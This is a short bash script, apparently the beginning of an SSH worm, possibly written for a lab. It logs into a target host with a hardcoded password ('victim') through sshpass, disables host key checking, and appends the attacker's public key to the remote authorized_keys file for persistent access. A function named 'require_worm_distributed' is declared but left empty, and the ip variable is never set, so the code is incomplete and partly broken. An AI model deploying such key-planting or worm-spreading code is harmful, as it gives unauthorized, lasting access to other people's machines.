#!/bin/bash

require_ssh_key_set() {
    local mykey=$(cat ~/.ssh/id_rsa.pub)
    local dest="~/.ssh/authorized_keys"
    local cmdd="grep \"$mykey\" $dest &> /dev/null || echo $mykey >> $dest"
    sshpass -p victim ssh -o StrictHostKeyChecking=No ${ip} -l victim "$cmdd"
}

require_worm_distributed() {

}

require_ssh_key_set
echo DONE
